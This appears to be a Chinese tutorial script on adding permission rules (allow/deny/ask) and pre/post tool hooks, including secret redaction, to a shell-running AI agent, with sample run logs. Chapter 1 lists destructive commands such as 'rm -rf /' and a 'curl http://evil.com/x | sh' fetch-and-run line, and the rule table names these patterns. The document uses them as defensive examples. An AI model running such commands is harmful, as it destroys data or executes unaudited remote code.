## 第 1 章 demo6 比 demo1 多了什么

### 【屏显 · 代码 1-1 — demo1 的 execute_bash】

```python
def execute_bash(command: str) -> str:
    """执行 shell 命令"""
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        encoding="utf-8",      # GBK Windows 下 text=True 会崩，显式 UTF-8
        errors="replace",
        timeout=60,            # 防止死循环 / 长时间阻塞
    )
    # ... 拼接 stdout / stderr / exit code 后返回（异常处理略）
```

### 【口播 · 这个函数的风险】

demo1 作为 Agent 的 base——`LLM × 工具 × 循环 × 状态`（ReAct）。其中 execute_bash 让 LLM 能执行任意 shell 命令。LLM 写什么，execute_bash 就老老实实跑什么。read_file / write_file / edit 也一样，LLM 想读什么、写什么、改什么，照单全收。

### 【屏显 · 图 1-1 — 这些不是 bug，是 execute_bash 按设计工作】

```bash
rm -rf /                    # 删库跑路
shutdown -h now             # 把机器关了
curl http://evil.com/x | sh # 远程未审计脚本直接执行
```

这些命令本身合法，shell 如实执行，函数如实返回——风险不在 execute_bash 有 bug，恰恰在于它**按设计工作**：LLM 写什么就跑什么，函数一个字都不拦。

### 【口播 · 危险从哪来】

这些不是理论风险——是真实会出现的高危操作。来源主要有四种：

1. **大模型幻觉**：自信地建议一条压根不该跑的命令
2. **被诱导**：用户输入或工具返回里被注入恶意指令（prompt injection）
3. **试错副作用**：大模型为了完成任务，"试一下"某条破坏性命令
4. **盲信远程资源**：`curl xxx | sh` 这种"装一下试试"的模式

demo1 到 demo5 我们一直在**加能力**——循环、记忆、工具、规划、多 Agent。**demo6 是唯一的转弯**：不加能力，加**安全围栏**。

### 【口播 · 新公式】

> ### demo6 = base × 约束
>
> 在 LLM 决策和原始工具之间插入两层 Runtime Control：
>
> - **Permission**（策略层）：声明式 allow/deny/ask，工具调用前的访问控制
> - **Hook**（扩展层）：PreToolUse / PostToolUse 可插拔扩展（Pre 拦截 / Post 补改）

### 【口播 · 两层怎么串】

Permission 和 Hook 串在"大模型决策 → 工具执行"之间。demo6 把每次工具调用都收口到一个核心入口 `dispatch_tool`，四步走：Pre hook 先看一眼拦不拦 / 改不改 → Permission 决定放不放行 → 放行才执行原始工具 → Post hook 还能往结果末尾补内容回灌 LLM。

### 【屏显 · 图 1-2 — dispatch_tool 四步流程】

```
LLM 决策 → tool_use(name, input)
              │
              ▼
     ┌─────────────────────┐
     │ dispatch_tool(...)  │  ← demo6 的核心入口
     └─────────────────────┘
              │
   ┌──────────▼──────────┐
   │ 1. PreToolUse hooks │  ── 扩展层：拦 / 改 / 记
   └──────────┬──────────┘
              │ pass
   ┌──────────▼──────────┐
   │ 2. Permission check │  ── 策略层：allow / deny / ask
   └──────────┬──────────┘
              │ allow
   ┌──────────▼──────────┐
   │ 3. 原始工具执行      │  ── demo1 的裸函数
   └──────────┬──────────┘
              │
   ┌──────────▼──────────┐
   │ 4. PostToolUse hooks│  ── 扩展层：观察 / 补改 output
   └──────────┬──────────┘
              │
              ▼
        结果回灌 LLM
```

> 真正的执行隔离（Sandbox / firejail / Docker / microVM）在调用链路**之下**，属于 Execution Environment——本 demo 不实现，留到演进方向再讲。下面两章分别拆 Permission（第 2 章）和 Hook（第 3 章）。

## 第 2 章 Permission —— 声明式规则引擎

### 【口播 · 为什么声明式】

demo6 用**声明式**——一张规则表说清楚"什么能做、什么不能做"，后续方便从外部加载（不用改代码）：

### 【屏显 · 代码 2-1 — PERMISSION_RULES】

```python
PERMISSION_RULES = [
    # —— 显式 deny —— 绝不让 LLM 跑的命令
    ("execute_bash", "rm -rf *",       "deny"),
    ("execute_bash", "mkfs.*",         "deny"),
    ("execute_bash", "shutdown*",      "deny"),
    ("execute_bash", "curl *| *sh*",   "deny"),

    # —— 显式 allow —— 安全只读类，免确认
    ("execute_bash", "ls *",           "allow"),
    ("execute_bash", "dir *",          "allow"),
    ("execute_bash", "cat *",          "allow"),
    ("execute_bash", "grep *",         "allow"),

    # —— 其他 execute_bash：问一下
    ("execute_bash", "*",              "ask"),

    # —— read_file / write_file：默认放行
    ("read_file",    "*",              "allow"),
    ("write_file",   "*",              "allow"),
]

DEFAULT_POLICY = "ask"
```

### 【口播 · 三要素】

每条规则是 `(tool_name, pattern, action)` 三元组：

- **tool_name**：作用于哪个工具
- **pattern**：`fnmatch` shell 通配符（`*` 匹配任意、`?` 匹配单字符），匹配工具的关键参数
  - `execute_bash` 匹配 `command`
  - `read_file` / `write_file` 匹配 `path`
- **action**：`allow`（放行）/ `deny`（拒绝）/ `ask`（问用户）

匹配顺序：**从上到下，first-match wins**。最后没命中的走 `DEFAULT_POLICY`。

### 【屏显 · 表格 2-1 — fnmatch 通配符示例】

| 规则 pattern | 匹配的命令示例 | 不匹配的命令示例 |
|---|---|---|
| `rm -rf *` | `rm -rf /`、`rm -rf test_dir/` | `rm test.txt`（无 -rf） |
| `ls *` | `ls -la`、`ls /tmp` | `lsof`、`echo ls` |
| `*` | 任意 | ——（catch-all） |

### 【屏显 · 代码 2-2 — _match_permission】

```python
def _match_permission(tool_name: str, key_value: str) -> str:
    """返回命中的 action（allow / deny / ask）；无命中返回 DEFAULT_POLICY。"""
    for rule_tool, pattern, action in PERMISSION_RULES:
        if rule_tool == tool_name and fnmatch.fnmatchcase(key_value, pattern):
            return action
    return DEFAULT_POLICY
```

### 【口播 · ask 的交互】

`ask` 走 `confirm_action()`，用户可选 `y/n/a`：

- `y` —— 本次允许
- `n` —— 本次拒绝（LLM 会看到拒绝原因，可改策略）
- `a` —— 本会话全允许（设全局 `_auto_approve_all = True`，后续 ask 自动通过）

### 【屏显 · 真实运行 2-1 — deny（命中黑名单，直接拦）】

````
用户: 帮我把 test_dir 目录删了

[执行工具] execute_bash({'command': 'rm -rf test_dir'})
  [Permission · deny] execute_bash('rm -rf test_dir')
[工具结果] [Permission 拒绝] execute_bash('rm -rf test_dir') 命中 deny 规则

—— 第 2 轮 LLM 判断任务完成（end_turn），最终回复 ——

抱歉，删除目录的命令被系统的安全规则拦截了（`rm -rf` 被禁止执行）。
你可以尝试以下方式自行操作：
1. **在终端中手动执行：**
   ```bash
   rm -rf test_dir
   ```
2. **如果你希望我用更安全的方式删除（比如先确认目录存在，再逐个删除文件），请告诉我，我可以尝试其他方法。**
是否需要我用其他方式来处理？
````

`rm -rf test_dir` 命中第一条 deny 规则 `("execute_bash", "rm -rf *", "deny")`，根本不执行、不问用户。注意 verbose 里那行 `[Permission · deny]`：dispatch_tool 打印的是命中动作，拒绝原因 `[Permission 拒绝] ...` 回灌 LLM，LLM 知道这条路堵了，转头建议你手动删。

### 【屏显 · 真实运行 2-2 — allow（命中白名单，免确认）】

```
用户: 看看 test_dir 目录下有什么文件

[执行工具] execute_bash({'command': 'ls test_dir'})
[工具结果] a.txt
b.txt
c.log
d.tmp
db.conf
```

`ls test_dir` 命中 `("execute_bash", "ls *", "allow")`，**静默放行**——注意 verbose 里没有任何 `[Permission · allow]` 那行：allow 不打扰，连日志都不打，直接出结果。频繁的只读操作（ls / cat / grep）不会被 ask 打断。

### 【屏显 · 真实运行 2-3 — ask（落到 catch-all，问用户）】

```
用户: 把 test_dir 里的 a.txt 删了

[执行工具] execute_bash({'command': 'rm test_dir/a.txt'})

[Permission · 需确认] execute_bash: rm test_dir/a.txt
  允许执行吗？[y/n/a] (y=本次允许, n=拒绝, a=本会话全允许): ... y
[工具结果]（用户确认后执行）
```

`rm test_dir/a.txt` 不匹配 `rm -rf *`（单文件无 -rf），也非只读 allow，落到 catch-all `("execute_bash", "*", "ask")` → 弹确认。三种 action 里 ask 是兜底：拿不准就交给人类。

## 第 3 章 Hook（Lifecycle Extension）—— 事件回调

### 【口播】

Runtime Control 的第二层是 Hook。Claude Code 把它叫 hook，概念上它是 **Lifecycle Extension**——在工具调用的生命周期点（执行前 / 执行后）插一段自定义逻辑：拦、改、记、**补**。两个名字同一个东西。

注意 Post 不只是「观察」：它还能**改 output**——要么**替换**整个 tool_result（如把读出的密钥脱敏），要么往末尾**追加**内容回灌给 LLM。这正是下面 scan_output 示例要做的事。

### 【屏显 · 表格 3-1 — Hook 事件类型】

| 事件 | 时机 | 能做什么 | 典型场景 |
|---|---|---|---|
| **PreToolUse** | 工具执行**前** | 拦（block）/ 改（modify_input）/ 放（pass） | 敏感词拦截、参数脱敏、配置审计 |
| **PostToolUse** | 工具执行**后** | 观察、记录、上报、**替换 / 补改 output（modified_output / output_delta）** | 敏感输出脱敏、metrics、cost tracker |

### 【口播 · 本 demo 的两个示例 hook】

本 demo 注册两个 hook，各演示 hook 层的一种「改法」——一个改 input（写入端）、一个改 output（读出端）：

- **hook_inject_shebang**（Pre）：写时增强——检测到 `write_file` 写 `.sh` 脚本，若开头没有 shebang 就在最前面补一行 `#!/bin/bash`，让脚本能 `./script` 直接执行。改的是**落盘的真实内容**：文件确实多了这一行。
- **hook_scan_output**（Post）：读时脱敏——把工具输出里的密钥替换成 [xxxxx]，再补一条「已脱敏」提示回灌 LLM。改的是**回灌 LLM 的内容**：文件本身没动，只是 LLM 看到的字符串被换了。

> 为什么 Pre 选「改」而不是「拦」？「拦写 .sh 脚本」和第 2 章 Permission 的 deny 在心智上重叠——都是"不让它写"。Hook 区别于 Permission 的杀手锏是**能改 input**：Permission 只能 allow/deny/ask（LLM 一定知道被拦），Hook 能在 LLM 毫无察觉时往脚本开头补一行 `#!/bin/bash` 再放行——下一节的实测会看到 LLM **坚信文件里只有 `echo hello`**。

### 【屏显 · 代码 3-1 — hook_inject_shebang（Pre，modify 改写 input）】

```python
def hook_inject_shebang(tool_name: str, tool_input: dict) -> dict:
    """Pre 示例：给 write_file 写的 .sh 脚本补上 #!/bin/bash shebang 后再放行（不改路径、不拦截）。"""
    if tool_name != "write_file":
        return {"decision": "pass"}
    path = tool_input.get("path", "")
    if not path.endswith(".sh"):                  # 只管 .sh 脚本
        return {"decision": "pass"}
    content = tool_input.get("content", "")
    if content.startswith("#!"):                  # 已有 shebang（任意 #! 开头）就不重复加
        return {"decision": "pass"}
    new_input = dict(tool_input)
    new_input["content"] = "#!/bin/bash\n" + content
    return {
        "decision": "modify",
        "modified_input": new_input,
        "message": "Hook 注入：写入 .sh 脚本，已在开头补上 #!/bin/bash shebang",
    }
```

### 【屏显 · 代码 3-2 — hook_scan_output（Post，替换 output + 提示回灌）】

```python
# Post hook（scan_output）用它把读出内容里的密钥值替换为 [xxxxx]（保留 key，大小写不敏感）。
# 教学版只认 password / api_key / secret 这几种 key。
_REDACT_RE = re.compile(
    r'((?:password|api_key|apikey|secret)\s*[:=]\s*)\S+',
    re.IGNORECASE,
)


def hook_scan_output(tool_name: str, tool_input: dict, tool_output: str) -> dict:
    """Post 示例：把工具输出里的疑似密钥/凭证脱敏成 [xxxxx]，再补「已脱敏」提示。"""
    redacted, n = _REDACT_RE.subn(r"\1[xxxxx]", tool_output)
    if n == 0:
        return {"message": "no secrets detected", "output_delta": ""}
    delta = f"\n\nℹ️ [Post hook] 输出含疑似凭证，已将 {n} 处敏感值脱敏为 [xxxxx]。"
    return {"message": f"redacted {n}", "modified_output": redacted, "output_delta": delta}
```

Post 拿到工具输出（如 `read_file` 读回的原文），用 `_REDACT_RE` 把 `password=hunter2` 换成 `password=[xxxxx]`。返回两个字段：**`modified_output`** 是脱敏后的完整 output，dispatch_tool 用它**替换**整个 tool_result；**`output_delta`** 是追加在末尾的「已脱敏 N 处」提示。一替换、一追加，LLM 下一轮看到的就是脱敏版 + 提示，真密钥没进它的视野。Pre 的 inject 不碰这条 regex——它做的是字符串拼接注入，和 Post 的正则替换各管一头。

### 【口播 · 注册与调度】

hook 注册到一张表，`run_hooks` 按事件依次跑：

### 【屏显 · 代码 3-3 — HOOKS 注册表 + run_hooks】

```python
HOOKS = {
    "PreToolUse":  [hook_inject_shebang],
    "PostToolUse": [hook_scan_output],
}

def run_hooks(event: str, tool_name: str, *args) -> dict:
    # Pre: block 立即终止；modify 链式改写 input（后一个 hook 看到前一个改写后的 input）
    # Post: 收集 message + output_delta；modified_output 取最后一个 hook 的（替换整个 output）
    aggregated = {"decision": "pass", "messages": [], "output_delta": "", "modified_output": None}
    current_input = args[0] if (event == "PreToolUse" and args) else None
    for hook in HOOKS.get(event, []):
        try:
            hook_args = (current_input,) if event == "PreToolUse" else args
            result = hook(tool_name, *hook_args)
        except Exception as e:
            result = {"message": f"hook 异常: {e}"}

        if event == "PreToolUse":
            decision = result.get("decision", "pass")
            if decision == "block":
                aggregated["decision"] = "block"
                aggregated["block_message"] = result.get("message", "hook 拦截")
                break
            if decision == "modify" and result.get("modified_input") is not None:
                current_input = result["modified_input"]
                aggregated["decision"] = "modify"
        if event == "PostToolUse" and result.get("modified_output") is not None:
            aggregated["modified_output"] = result["modified_output"]
        if result.get("message"):
            aggregated["messages"].append(result["message"])
        if result.get("output_delta"):           # Post hook 补的内容聚合起来
            aggregated["output_delta"] += result["output_delta"]
    if aggregated["decision"] == "modify":
        aggregated["modified_input"] = current_input
    return aggregated
```

`run_hooks` 的关键在 **modify 链**：`current_input` 从原始 input 出发，每个 Pre hook 若返回 `modify` 就把 `current_input` 替换成改写后的版本，下一个 hook 看到的已是改写结果——多个 modify hook 可以层层接力。最终若整链产出了 modify，`aggregated["modified_input"]` 就是改写后的 input，dispatch_tool 用它（而非原始 input）去执行工具。Post hook 也有两条通路：`modified_output` 让 dispatch_tool **替换**整个 output（如把读出的密钥脱敏成 [xxxxx]），`output_delta` 则**追加**到末尾（如「已脱敏 N 处」提示）；先替换再追加，LLM 看到的就是脱敏版 + 提示。**这些通路都不经过主循环**——run_agent 仍是 demo1 的 ReAct，一个字没改。

### 【屏显 · 真实运行 3-1 — Hook 注入（Pre 改写 input，LLM 浑然不觉）】

让 Agent 写一个极简的 `.sh` 脚本（2026-07-28 实测）：

```
用户: 写个 hi.sh 脚本，内容就一行 echo hello

[执行工具] write_file({'path': 'hi.sh', 'content': 'echo hello\n'})
  [Hook · Pre] 改写输入: Hook 注入：写入 .sh 脚本，已在开头补上 #!/bin/bash shebang
[工具结果] [成功] 文件已写入: hi.sh (23 字符)

—— 第 2 轮 LLM 判断任务完成（end_turn），最终回复 ——

已创建 `hi.sh`，内容就一行 `echo hello`。可以直接运行 `bash hi.sh` 试试，会输出 `hello`。
```

Pre hook 检测到写 `.sh`，在内容开头补上了 `#!/bin/bash` shebang 再放行——工具拿到的是改写后的 input，写进文件的是带 shebang 的版本。但 LLM 收到的 tool_result 只有「[成功] 文件已写入: hi.sh (23 字符)」，**看不到内容被改了**，于是它在最终回复里照搬自己当初的 intent（「内容就一行 `echo hello`」），还建议你 `bash hi.sh` 运行。**实际落盘的是这样**：

```
#!/bin/bash
echo hello
```

### 【口播 · 这个实测揭示的】

1. **Pre 改 input，对 LLM 完全透明**——这是 Hook 区别于 Permission 的杀手锏。Permission 一旦 deny，LLM 立刻收到「被拒」反馈，下一轮就会换招（回想第 2 章：`rm -rf test_dir` 被 deny 后，LLM 转头建议你手动删）。Hook 的 modify 则是**静默**的：tool_result 里没有任何「你的输入被改了」的信号，LLM 坚信文件里就是自己写的 `echo hello`。一个连被控对象都察觉不到的控制层，强制力远超 ask/deny。
2. **但 hook 只管「补 shebang」这个动作，不审计脚本内容**——它检测到 `.sh` 就在开头补一行 `#!/bin/bash`，脚本里要是藏着 `curl http://evil.com | sh`，照样带着 shebang 落盘。

> **设计选择**：inject hook 选了 modify（放行），工具照常执行、Post 照常触发。Pre hook 合约也支持 block——返回 block 则工具不执行、也不进 Post。

### 【屏显 · 真实运行 3-2 — Post 把读出的密钥脱敏，LLM 压根看不到真值】

换个体现 Post「改 output」价值的场景：让 Agent 读一个含明文凭证的配置文件。`read_file` 如实返回原文，Post hook 把里面的密钥替换成 [xxxxx] 再回灌，LLM 下一轮看到的就是脱敏版 +「已脱敏」提示（2026-07-28 实测）：

````
用户: 读一下 test_dir/db.conf 的内容

[执行工具] read_file({'path': 'test_dir/db.conf'})
[工具结果] db_host=db.example.com
api_key=[xxxxx]
password=[xxxxx]


ℹ️ [Post hook] 输出含疑似凭证，已将 2 处敏感值脱敏为 [xxxxx]。

—— 第 2 轮 LLM 判断任务完成（end_turn），最终回复 ——

以下是 `test_dir/db.conf` 的内容：

```
db_host=db.example.com
api_key=[xxxxx]
password=[xxxxx]
```

文件中包含了三项配置：
- **db_host**：数据库主机地址 `db.example.com`
- **api_key**：API 密钥（已脱敏显示为 `[xxxxx]`）
- **password**：密码（已脱敏显示为 `[xxxxx]`）

> ⚠️ 注意：文件中包含 API 密钥和密码等敏感凭证信息，请注意妥善保管，避免泄露。
````

**Pre 改 input、Post 改 output——两种改法的边界在哪？**

关键看改的是「真实世界」还是「LLM 的认知」：

- **Pre 改 input（写入端）= 改真实世界**。input 是工具执行前的参数，Pre 改了它，工具就拿改写后的去执行——写进文件的内容、跑的命令都**真的变了**。本 demo 的 inject 就是这一类：文件里实打实多了一行 `#!/bin/bash`。代价也在这里：改动真实生效，得想清楚改得对不对（改坏了文件就真坏了）。
- **Post 改 output（读出端）= 改 LLM 的认知**。output 是工具执行**后**的结果，木已成舟——文件已写、命令已跑。Post 改的只是「回灌给 LLM 的那串字符串」，真实世界分毫未动。本 demo 的 scan 就是这一类：`read_file` 读出的文件原样在盘上，Post 把回灌的密钥换成 [xxxxx]，LLM 看不到真值、也就没法外传。

一句话：**Pre 能改真实发生的事，Post 只能改 LLM 看到的事**。所以「写时增强文件」只能在 Pre（要赶在落盘前），「读时对 LLM 脱敏」只能在 Post（read 的 input 只有 path，Pre 够不到读出的内容）。两个 hook 各占一端，不是重复，而是覆盖了工具生命周期的两个不同切面。

## 第 4 章 局限、演进和总结

### 【口播 · demo6 实现了什么】

demo6 在 demo1 的裸工具（`execute_bash` / `read_file` / `write_file` / `edit`）和 LLM 决策之间，插入了一个 `dispatch_tool`，串起两层 Runtime Control：

- **Permission**（策略层）：声明式 `allow` / `deny` / `ask`，工具调用前的准入决策
- **Hook**（扩展层）：PreToolUse 改 input、PostToolUse 补 output

两层都由 `dispatch_tool` 强制执行，LLM 绕不过去——约束落在代码层，不靠 prompt 引导。这就是 demo6 相对 demo1 的全部新增：**不加能力，加安全围栏**。

### 【口播 · 演进方向】

demo6 是教学版，每层都简化了。往生产级走，三个主要方向：

1. **Permission 配置化**——demo6 的规则是 Python 列表硬编码（改一次重启一次）；生产级从 YAML / JSON 加载，支持企业 / 项目 / 用户 / 会话多级叠加。黑名单也天然有盲区：demo6 的 `write_file` 全 allow，写关键文件不受限；生产级要配白名单或写入审计。
2. **Hook 扩展到更多生命周期点**——demo6 只有 Pre/PostToolUse；生产级还有 SessionStart / UserPromptSubmit / PreCompact / Stop 等。
3. **Sandbox 独立执行环境**——demo6 止于 Runtime Control，`execute_bash` 直接跑在宿主机；生产级在链路之下再叠一层隔离（firejail / Docker / microVM），把爆炸半径关进笼子。这是 Runtime Control 之外的**第三个正交维度**——它和 Permission 是兜底关系而非替代：Permission 是事前的规则判断，规则可能漏掉新的危险命令；Sandbox 是事后的物理隔离，不依赖判断，即便 Permission 漏判，`rm -rf /` 也只在沙箱里炸，碰不到宿主机。

> 再激进一派的流派（如开源 harness **Pi**）干脆**不做内置 Permission**：规则判断终究会漏，不如把约束整个推给容器化（microVM / Docker），harness 自身保持极简。所以 Permission 是一种**设计选择而非唯一正解**——内建规则层（demo6）、纯外置隔离（Pi）、夹在中间的编辑审批（OhMyPi），三种立场都合法。

### 【口播 · 总结：demo6 是安全轴】

demo1 到 demo5 一直在加能力（循环、记忆、工具、规划、多 Agent），demo6 是唯一的转弯——加约束。6 条正交轴合起来，就是一个完整 Agent 的所有横切关注点。

### 【屏显 · 收尾公式】

```
demo1: base = LLM × 工具 × 循环 × 状态
demo6: = base × 约束               （Permission + Hook）
```
